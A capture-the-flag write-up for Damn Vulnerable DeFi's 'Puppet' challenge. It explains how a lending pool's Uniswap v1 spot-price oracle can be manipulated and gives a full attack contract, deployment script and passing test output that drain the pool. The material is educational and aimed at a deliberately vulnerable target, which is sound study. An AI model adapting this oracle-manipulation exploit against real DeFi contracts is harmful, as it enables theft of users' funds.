<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/8.png">

# Target Contract Review

Given contract.

**PupperPool.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
token = DamnValuableToken(tokenAddress);
uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
uint256 depositRequired = calculateDepositRequired(amount);

if (msg.value < depositRequired)
    revert NotEnoughCollateral();

if (msg.value > depositRequired) {
    unchecked {
payable(msg.sender).sendValue(msg.value - depositRequired);
    }
}

unchecked {
    deposits[msg.sender] += depositRequired;
}

// Fails if the pool doesn't have enough tokens in liquidity
if(!token.transfer(recipient, amount))
    revert TransferFailed();

emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
// calculates the price of the token in wei according to Uniswap pair
return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}
```

The `PuppetPool` contract is a smart contract that allows users to borrow tokens by depositing collateral in the form of ETH.

It defines a constant `DEPOSIT_FACTOR` which is set to 2. This factor is used to calculate the required deposit amount based on the borrowed token amount.

In the constructor, it gets instance of `DamnValuableToken` and address of **Uniswap pair for the token**.

`barrow()` : Allows users to borrow tokens by depositing collateral in the form of ETH. The function takes the desired borrow amount and the recipient address as parameters. The function checks if the user has provided enough collateral and refunds any excess ETH. It then transfers the borrowed tokens to the recipient address.

`calculateDepositRequired()` : Calculates the required deposit amount based on the desired borrow amount. It uses the `_computeOraclePrice()` function to get the price of the token in wei.

`_computeOraclePrice()` : Calculates the price of the token in wei based on the ETH balance of the Uniswap pair and the token balance of the pair.


Challenge's message:

> There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.

# Subverting

To pass the challenge, we must send ether to `barrow()` function more than `depositRequired`'s value. Here is calculation method of depositRequired's value:

```solidity
uint256 oraclePrice = uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair); // _computeOraclePrice()
uint256 depositRequired = amount * tokenPrice * 2 / 10 ** 18
```

As evident from the code, it is apparent that **we have the capability to influence the token's price through the oracle function by adjusting the balance within the Uniswap pool**.

The token's price is inversely correlated with the pool's token balance, meaning that as the balance within **the pool increases, the token's value decreases**. This phenomenon is achievable because **the pool contains relatively limited liquidity compared to our token holdings, granting us the ability to influence the price dynamics of this particular pool**.

In this case, we learned **1 ETH = 1 DVT**.


Also, in the [uniswap v1's whitepaper](https://hackmd.io/@HaydenAdams/HJ9jLsfTz#Swaps-vs-Transfers), it says:

> The functions `ethToTokenSwap()`, `tokenToEthSwap()` , and `tokenToTokenSwap()` **return purchased tokens to the buyers address**.
The functions `ethToTokenTransfer()`, `tokenToEthTransfer()`, and `tokenToTokenTransfer()` **allow buyers to make a trade and then immediately transfer purchased tokens to a recipient address**.

In this challenge, if we used this method like `tokenToEthSwapInput(balance, 1, block.timestamp * 2)`, after the swap, the oracle within the puppet pool will compute a reduced value for the DVT token's price. Consequently, this implies that we'll have the ability to **borrow all the DVT tokens held within the pool with just a small amount of ETH (the collateral)**. Let's look at the attack contract:

```solidity
pragma solidity ^0.8.0;

import "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";
interface IUniswap {
  function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);
}
contract AttackPuppet {
    IUniswap uniswap;
    DamnValuableToken token;
    PuppetPool pool;

  constructor(address _pool, address _token, address _uniswap, uint8 v, bytes32 r, bytes32 s) payable {
    uniswap = IUniswap(_uniswap);
    token = DamnValuableToken(_token);
    pool = PuppetPool(_pool);
    uint256 balance = token.balanceOf(msg.sender);
    token.permit(msg.sender,address(this),type(uint256).max,type(uint256).max,v,r,s /* Player Signature Verification */);
    token.transferFrom(msg.sender, address(this), balance);
    token.approve(address(uniswap), balance);
    uniswap.tokenToEthSwapInput(balance, 1, block.timestamp * 2);
    uint256 poolBalance = token.balanceOf(address(pool));
    pool.borrow{ value: 20 ether }(poolBalance, address(this));
    token.transfer(msg.sender, token.balanceOf(address(this)));
  }
}
```

Get the instances of the contracts.

```solidity
uniswap = IUniswap(_uniswap);
token = DamnValuableToken(_token);
pool = PuppetPool(_pool);
```


We’ll use **a signature for an ERC-2612** `permit()` function, which allows our attack contract to **take tokens from our account (EOA) during the attack execution**. Then, we will pull the player's balance.

```solidity
uint256 balance = token.balanceOf(msg.sender);
token.permit(msg.sender,address(this),type(uint256).max,type(uint256).max,v,r,s /* Player Signature Verification */);
token.transferFrom(msg.sender, address(this), balance);
```

Now that we’ve got our player balance into `AttackPuppet` we’ll approve uniswap to spend our tokens, which is required to perform the swap and get an under-collateralized position.

```solidity
token.approve(address(uniswap), balance);
uniswap.tokenToEthSwapInput(balance, 1, block.timestamp * 2);
```

At this point, the uniswap price oracle ought to be furnishing a distorted price data stream, enabling us to secure the loan at a significantly reduced rate. Finally, we can transfer the DVT we acquired from the contract to our player account.

```solidity
uint256 poolBalance = token.balanceOf(address(pool));
pool.borrow{ value: 20 ether }(poolBalance, address(this));
token.transfer(msg.sender, token.balanceOf(address(this)));
```

Here are the attacker commands:

```js
const { signERC2612Permit } = require('eth-permit');
    
const attackContract = ethers.utils.getContractAddress({
    from: player.address,
    nonce: 0
});
    
const { v, r, s } = await signERC2612Permit(
    player,
    token.address,
    player.address,
    attackContract,
    ethers.constants.MaxUint256
);
    
await ethers.getContractFactory('AttackPuppet', player).then(c => c.deploy(
    lendingPool.address,
    token.address,
    uniswapExchange.address,
    v,
    r,
    s,
    { value: ethers.utils.parseEther('20') }
));
```

Solve the challenge.

```powershell
  [Challenge] Puppet
    ✔ Execution (647ms)


  1 passing (2s)

Done in 3.59s.
```

**_by wasny0ps_**
